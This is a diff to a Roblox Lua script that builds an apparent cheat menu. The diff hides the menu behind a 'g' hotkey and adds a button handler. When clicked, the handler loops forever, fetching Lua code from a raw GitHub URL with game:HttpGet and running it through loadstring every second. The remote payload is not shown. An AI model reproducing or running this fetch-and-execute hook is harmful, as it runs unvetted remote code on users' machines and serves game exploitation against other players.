@@ -1,6 +1,6 @@
-
 local player = game.Players.LocalPlayer
 local mouse = player:GetMouse()
+bind = "g"
 local GameScriptGui = Instance.new("ScreenGui")
 local MainFrame = Instance.new("Frame")
 local Tittle = Instance.new("Frame")
@@ -20,7 +20,7 @@ MainFrame.BorderSizePixel = 0
 MainFrame.Draggable = true
 MainFrame.Position = UDim2.new(0.339118838, 0, 0.0474308431, 0)
 MainFrame.Size = UDim2.new(0, 564, 0, 304)
-MainFrame.Visible = true
+MainFrame.Visible = false
 Tittle.Name = "Tittle"
 Tittle.Parent = MainFrame
 Tittle.BackgroundColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
@@ -40,11 +40,23 @@ Secrt.Text = "Сикретный враг"
 Secrt.TextColor3 = Color3.new(1, 0, 0)
 Secrt.TextSize = 14
 
+
+
+
+
+Secrt.MouseButton1Down:connect(function()
+while true do
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/Player-Frisk/Test/4107c271eb13ddb1a2fbbef8f754d249ce6dc2dd/Ch.Lua'),true))()
+wait(1)
+end 
+end)
+
+
 mouse.KeyDown:connect(function(key)
-if key == OpenMenu then
+if key == bind then
     if MainFrame.Visible == true then 
-    MainFrame:TweenPosition(UDim2.new(0.384,0,-1,0), 'Out', 'Elastic', 3)
     MainFrame.Visible = false
+    MainFrame:TweenPosition(UDim2.new(0.384,0,-1,0), 'Out', 'Elastic', 3)
     end
     if MainFrame.Visible == false then
     MainFrame.Visible = true
